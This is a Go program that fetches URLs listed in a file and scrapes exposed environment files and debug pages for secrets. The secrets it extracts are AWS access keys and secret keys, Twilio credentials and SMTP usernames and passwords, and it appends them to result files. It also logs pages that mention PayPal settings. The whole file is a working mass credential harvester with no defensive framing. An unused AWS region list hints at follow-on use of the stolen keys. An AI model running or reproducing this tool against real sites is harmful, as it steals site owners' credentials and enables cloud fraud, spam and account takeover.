package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"sync"
)

var (
	listRegion = `us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1`
	resultDir   = "Results"
	restoreFile = ".nero_swallowtail"
	wg          sync.WaitGroup
)

type scannENV struct{}

func main() {
	err := os.Mkdir(resultDir, 0755)
	if err != nil && !os.IsExist(err) {
		fmt.Println("Error creating result directory:", err)
		return
	}

	urls := readURLsFromFile()
	if len(urls) == 0 {
		fmt.Println("No URLs found in the file.")
		return
	}

	for _, url := range urls {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			scannENV{}.processURL(url)
		}(url)
	}

	wg.Wait()
	fmt.Println("Scanning completed.")
}

func readURLsFromFile() []string {
	file, err := os.Open("urls.txt")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return nil
	}
	defer file.Close()

	content, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return nil
	}

	urls := regexp.MustCompile(`(?m)^(https?://\S+)$`).FindAllString(string(content), -1)
	return urls
}

func (a scannENV) processURL(url string) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error making HTTP request:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading HTTP response:", err)
		return
	}

	text := string(body)
	if a.paypal(text, url) {
		fmt.Println("PayPal sandbox found in:", url)
	}
	if a.getAWSData(text, url) {
		fmt.Println("AWS credentials found in:", url)
	}
	if a.getTwilio(text, url) {
		fmt.Println("Twilio credentials found in:", url)
	}
	if a.getSMTP(text, url) {
		fmt.Println("SMTP credentials found in:", url)
	}
}

func (a scannENV) paypal(text, url string) bool {
	if regexp.MustCompile(`PAYPAL_`).MatchString(text) {
		saveToFile(url, "paypal_sandbox.txt")
		return true
	}
	return false
}

func (a scannENV) getAWSData(text, url string) bool {
	if regexp.MustCompile(`AWS_ACCESS_KEY_ID`).MatchString(text) || regexp.MustCompile(`AWS_KEY`).MatchString(text) || regexp.MustCompile(`SES_KEY`).MatchString(text) {
		awsKey := extractValue(text, `AWS_ACCESS_KEY_ID=(.*?)\n`, `<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		awsSecret := extractValue(text, `AWS_SECRET_ACCESS_KEY=(.*?)\n`, `<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		saveToFile(fmt.Sprintf("%s\n%s", awsKey, awsSecret), "aws_credentials.txt")
		return true
	}
	return false
}

func (a scannENV) getTwilio(text, url string) bool {
	if regexp.MustCompile(`TWILIO_SID`).MatchString(text) || regexp.MustCompile(`TWILIO_KEY`).MatchString(text) || regexp.MustCompile(`TWILIO_SECRET`).MatchString(text) {
		twilioSid := extractValue(text, `TWILIO_SID=(.*?)\n`, `<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		twilioKey := extractValue(text, `TWILIO_KEY=(.*?)\n`, `<td>TWILIO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		twilioSecret := extractValue(text, `TWILIO_SECRET=(.*?)\n`, `<td>TWILIO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		saveToFile(fmt.Sprintf("%s\n%s\n%s", twilioSid, twilioKey, twilioSecret), "twilio_credentials.txt")
		return true
	}
	return false
}

func (a scannENV) getSMTP(text, url string) bool {
	if regexp.MustCompile(`SMTP_HOST`).MatchString(text) || regexp.MustCompile(`SMTP_USERNAME`).MatchString(text) || regexp.MustCompile(`SMTP_PASSWORD`).MatchString(text) {
		smtpHost := extractValue(text, `SMTP_HOST=(.*?)\n`, `<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		smtpUsername := extractValue(text, `SMTP_USERNAME=(.*?)\n`, `<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		smtpPassword := extractValue(text, `SMTP_PASSWORD=(.*?)\n`, `<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>`)
		saveToFile(fmt.Sprintf("%s\n%s\n%s", smtpHost, smtpUsername, smtpPassword), "smtp_credentials.txt")
		return true
	}
	return false
}

func extractValue(text, regex1, regex2 string) string {
	r1 := regexp.MustCompile(regex1)
	r2 := regexp.MustCompile(regex2)
	matches := r1.FindStringSubmatch(text)
	if len(matches) > 1 {
		return matches[1]
	}
	matches = r2.FindStringSubmatch(text)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

func saveToFile(content, filename string) {
	filePath := fmt.Sprintf("%s/%s", resultDir, filename)
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(content + "\n"); err != nil {
		fmt.Println("Error writing to file:", err)
	}
}
